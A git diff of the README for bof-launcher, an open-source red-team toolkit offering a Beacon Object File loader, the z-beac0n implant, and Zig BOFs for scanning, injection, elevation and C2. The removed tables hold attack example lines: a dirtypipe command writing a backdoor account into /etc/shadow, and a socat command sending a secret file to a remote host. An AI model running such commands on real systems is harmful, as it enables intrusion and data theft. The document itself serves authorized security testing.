@@ -11,10 +11,11 @@ The repository provides:
 3. [Z-Labs BOFs collection](#z-Labs-bofs-collection) - growing collection of OS-specific and cross-platform BOFs for usage during a red team engagements.
 4. ['bof' command line tool](examples/cli4bofs) - a swiss army knife tool for running, injecting and organizing your BOFs collection.
 
+<br>
 
-See [here](ROADMAP.md) for project's roadmap.
+See [here](ROADMAP.md) for the project's ROADMAP.
 
-See [here](#building-all-components) for building instructions.
+See [here](#building-all-components) for the building instructions.
 
 # bof-launcher library
 
@@ -30,7 +31,7 @@ Library features:
 
 - Capable of running [BOFs](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm) that adhere to [Windows BOF template](https://github.com/Cobalt-Strike/bof_template) and [Linux BOF template](https://github.com/outflanknl/nix_bof_template).
 - Fully integrable with programs written in C/C++/Zig/Go or Rust. See [examples](examples/) for sample integrations.
-- Adds capability to write BOFs in [Zig programming language](https://ziglang.org/) - which is a low-level langauge with a goal of being a "better C".
+- Adds capability to write BOFs in [Zig programming language](https://ziglang.org/) - which is a low-level language with a goal of being a "better C".
 - Access to [rich std library](https://ziglang.org/documentation/0.15.2/std/) during BOF development: lists, hash maps, cross-platform OS layer, http, networking, threading, crypto and compression.
 - Capability to implement cross-platform BOFs (see: [udpScanner]((bofs/src/udpScanner.zig)), [tcpScanner]((bofs/src/tcpScanner.zig)), [grep]((bofs/src/grep.zig)) and various other BOFs).
 - Provides modern sleepmasking functionality.
@@ -40,108 +41,43 @@ Library features:
 - ARM and AARCH64 support on Linux.
 - Flexible [API](bof-launcher/src/bof_launcher_api.h) allowing for BOF chaining (works like `Bash` pipes but purely in-memory) both on Linux and Windows.
 
-bof-launcher C API:
-
-```c
-int bofLauncherInit(void);
-void bofLauncherRelease(void);
-
-int bofMemoryMaskKey(const unsigned char* key, int key_len);
-int bofMemoryMaskWin32ApiCall(const char* win32_api_name, int masking_enabled);
-
-int bofObjectInitFromMemory(const unsigned char* file_data_ptr, int file_data_len, BofObjectHandle* out_bof_handle);
-
-void bofObjectRelease(BofObjectHandle bof_handle);
-int bofObjectIsValid(BofObjectHandle bof_handle);
-
-void* bofObjectGetProcAddress(BofObjectHandle bof_handle, const char* name);
-
-int bofRun(const unsigned char* file_data_ptr, int file_data_len);
-int bofObjectRun(BofObjectHandle bof_handle,
-             unsigned char* arg_data_ptr,
-             int arg_data_len,
-             BofContext** out_context);
-int bofObjectRunAsyncThread(BofObjectHandle bof_handle,
-             unsigned char* arg_data_ptr,
-             int arg_data_len,
-             BofCompletionCallback completion_cb,
-             void* completion_cb_context,
-             BofContext** out_context);
-int bofObjectRunAsyncProcess(BofObjectHandle bof_handle,
-             unsigned char* arg_data_ptr,
-             int arg_data_len,
-             BofCompletionCallback completion_cb,
-             void* completion_cb_context,
-             BofContext** out_context);
-
-void bofContextRelease(BofContext* context);
-int bofContextIsRunning(BofContext* context);
-void bofContextWait(BofContext* context);
-unsigned char bofContextGetExitCode(BofContext* context);
-const char* bofContextGetOutput(BofContext* context, int* out_output_len);
-BofObjectHandle bofContextGetObjectHandle(BofContext* context);
-
-int bofArgsInit(BofArgs** out_args);
-int bofArgsInit(BofArgs** out_args);
-void bofArgsRelease(BofArgs* args);
-int bofArgsAdd(BofArgs* args, unsigned char* arg, int arg_len);
-void bofArgsBegin(BofArgs* args);
-void bofArgsEnd(BofArgs* args);
-const char* bofArgsGetBuffer(BofArgs* args);
-int bofArgsGetBufferSize(BofArgs* args);
-```
-
 # z-beac0n
+
+Extremely modular and versatile pre-C2 implant for Windows and Linux.
 
 ![z-beac0n in action](https://github.com/The-Z-Labs/bof-launcher/blob/main/bin/ops.gif)
 
 For details see here: [z-beac0n - Open Adversary Simulation Toolkit](https://github.com/The-Z-Labs/bof-launcher/tree/main/examples/implant)
 
-## Liability
-
-This is an open source project meant to be used with authorization to assess the security posture and for research purposes.
 
 # Z-Labs BOFs collection
 
-## Cross-platform BOFs
+In addition to `bof-launcher` and `z-beac0n` projects, we maintain growing collection of our BOFs in this repository. Main differentiator of these BOFs is that they are implemented in `Zig` programming language. This, among other advantages like (modern language syntax, access to rich std library), brings the capability to implement truly cross-platform BOFs. 
 
-| BOF name  | Description | Supported platforms | Example
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| [z-beac0n core](bofs/src/z-beac0n-core.zig) | So called BOF zero (BOF0), BOF that operates as standalone implant, manages other loaded BOFs; capable of executing other BOFs | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `z-beac0n` |
-| [tcpScanner](bofs/src/tcpScanner.zig)  | TCP connect() port scanner  | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `tcpScanner 4.3.2.1-255:22,80` |
-| [udpScanner](bofs/src/udpScanner.zig) | UDP port sweeper | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `udpScanner 4.3.2.1-255:5000-5010` |
-| [whoami](bofs/src/whoami.zig) | On Linux: print effective user name; On Windows: output the current UserName and domain | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `whoami` |
-| [pwd](bofs/src/pwd.zig) | print name of current/working directory | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `pwd` |
-| [cd](bofs/src/cd.zig) | change working directory | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `cd /` |
-| [cat](bofs/src/cat.zig) | print content of a file | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `cat /etc/passwd` |
-| [zcat](bofs/src/zcat.zig) | print content of a gzip compressed file | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `cat /boot/config.gz` |
-| [ls](bofs/src/ls.zig) | list directory content | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `ls /etc` |
-| [whereami](bofs/src/whereami.zig) | print hypervisor vendor signature from CPUID | `Linux x86/x86_64`; `Windows x86/x86_64` | `whereami` |
-| [grep](bofs/src/grep.zig) | Print lines that match patterns | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `grep root /etc/passwd` |
-| [find](bofs/src/find.zig) | Search for files in a directory hierarchy | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `find /dev -type b` |
+We have two types of BOFs here:
 
-## Linux-only BOFs
+1. Conventional BOFs that are fully compatible with original `Cobalt Strike` BOFs and can be run in other red teaming toolboxes as well. Specifically, [Sliver](https://github.com/BishopFox/sliver), [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2) and [Meterpreter](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html) were [tested](bofs/socat).<br>
 
-| BOF name  | Description | Supported platforms | Example
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| [dirtypipe](bofs/src/dirtypipe.zig) | Exploit for 'dirtypipe' vulnerability (CVE-2022-0847) implemented as a BOF | `Linux x86/x86_64/ARMv6+/AArch64` | `dirtypipe /etc/shadow 913 "backdoor:xxx:10123::::::"` |
-| [kmodLoader](bofs/src/kmodLoader.zig) | API-style BOF; load/unload kernel module directly from memory (root privileges required) | `Linux x86/x86_64/ARMv6+/AArch64` | see docs |
-| [lskmod](bofs/src/lskmod.zig) | list currently loaded kernel modules | `Linux x86/x86_64/ARMv6+/AArch64` | `lskmod` |
-| [hostname](bofs/src/coreutils/hostname.zig) | show the system's host name | `Linux x86/x86_64/ARMv6+/AArch64` | `hostname` |
-| [hostid](bofs/src/coreutils/hostid.zig) | print the numeric identifier for the current host | `Linux x86/x86_64/ARMv6+/AArch64` | `hostid` |
-| [id](bofs/src/coreutils/id.zig) | print real and effective user and group IDs | `Linux x86/x86_64/ARMv6+/AArch64` | `id www-data` |
-| [uname](bofs/src/coreutils/uname.zig) | print system information | `Linux x86/x86_64/ARMv6+/AArch64` | `uname -a` |
-| [uptime](bofs/src/coreutils/uptime.zig) | show how long the system has been running | `Linux x86/x86_64/ARMv6+/AArch64` | `uptime` |
-| [who](bofs/src/coreutils/who.zig) | print currently logged in users | `Linux x86/x86_64/ARMv6+/AArch64` | `who` |
-| [ifconfig](bofs/src/net-tools/ifconfig.zig) | Display the status of the currently active network interfaces. With root privileges: also manipulate current state of the device | `Linux x86/x86_64/ARMv6+/AArch64` | `ifconfig eth0 promisc` |
-| [socat](bofs/socat/) | Arbitrary TCP and TLS connections | `Linux x86/x86_64/ARMv6+/AArch64` | `socat OPEN:/etc/secretdata TLS:remotehost:8443` |
+| Category  | Description | BOFs list | Documentation |
+| ---------------- | ----------- | --------- | ------------- |
+| SAL-BOF | Local Situational Awareness BOFs | [lskmod](bofs/src/lskmod.zig), [hostname](bofs/src/coreutils/hostname.zig), [hostid](bofs/src/coreutils/hostid.zig), [id](bofs/src/coreutils/id.zig), [uname](bofs/src/coreutils/uname.zig),<br>[uptime](bofs/src/coreutils/uptime.zig), [who](bofs/src/coreutils/who.zig), [ifconfig](bofs/src/net-tools/ifconfig.zig), [whoami](bofs/src/whoami.zig), [whereami](bofs/src/whereami.zig), [winver](bofs/src/wWinver.zig) | [SAL-BOF reference](bofs/SAL-BOF.md) |
+| FS-BOF | Filesystem interaction BOFs | [pwd](bofs/src/pwd.zig), [cd](bofs/src/cd.zig), [cat](bofs/src/cat.zig), [zcat](bofs/src/zcat.zig), [ls](bofs/src/ls.zig), [find](bofs/src/find.zig) | [FS-BOF reference](bofs/FS-BOF.md) |
+| NET-BOF | Networking BOFs | [socat](bofs/src/socat.zig) | [NET-BOF reference](bofs/socat/) |
+| SAR-BOF | Remote Situational Awareness BOFs | [tcpScanner](bofs/src/tcpScanner.zig), [udpScanner](bofs/src/udpScanner.zig) | [SAR-BOF reference](bofs/SAR-BOF.md) |
+| Elevation-BOF | Context elevation BOFs | [dirtypipe](bofs/src/dirtypipe.zig) | [Elevation-BOF reference](bofs/Elevation-BOF.md) |
+| Injection-BOF | Process injection BOFs | [processInjectionSrdi](bofs/src/wProcessInjectionSrdi.zig) | [Injection-BOF reference](bofs/Injection-BOF.md) |
+| TEXT-BOF | Text processing BOFs | [grep](bofs/src/grep.zig) | [TEXT-BOF reference](bofs/TEXT-BOF.md) |
 
-## Windows-only BOFs
 
-| BOF name  | Description | Supported platforms | Example
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| [winver](bofs/src/wWinver.zig) | show the edition, version, and system type of Windows operating system | `Windows x86/x86_64` | `winver` |
-| [processInjectionSrdi](bofs/src/wProcessInjectionSrdi.zig) | This BOF can inject any other BOF to any running process | `Windows x86/x86_64` | `cli4bofs inject file:abs_path_to_bof -i:<pid>` |
+<br>
+
+2. Special purposes BOFs, that serve specifically as a buliding blocks for our `z-beac0n` implant.<br>
+
+| Category  | Description | BOFs list | Documentation |
+| --------- | ----------- | --------- | ------------- |
+| BOF0 | So called `BOF zero`. Those ones operate as standalone implants, managing and executing other loaded BOFs (both conventional and API-style) | [z-beac0n core](bofs/src/z-beac0n-core.zig) | [BOF0 reference](bofs/BOF0.md) |
+| C2-BOF | Special purpose API-style BOFs providing alternative C2 communication channels | [C2channelHTTPS](bofs/src/C2channelHTTPS.zig) | [C2-BOF reference](bofs/C2-BOF.md) |
+| API-BOF | Misc API-style BOFs | [kmodLoader](bofs/src/kmodLoader.zig) | [API-BOF reference](bofs/API-BOF.md) |
 
 # Building all components
 
@@ -163,3 +99,7 @@ To build and run test BOFs do:
 To run tests on foreign CPU architectures, you can use [QEMU](https://www.qemu.org/) which is nicely integrated in Zig:
 
     zig build test -fqemu --glibc-runtimes /usr
+
+# Liability
+
+This is an open source project meant to be used with authorization to assess the security posture and for research purposes.
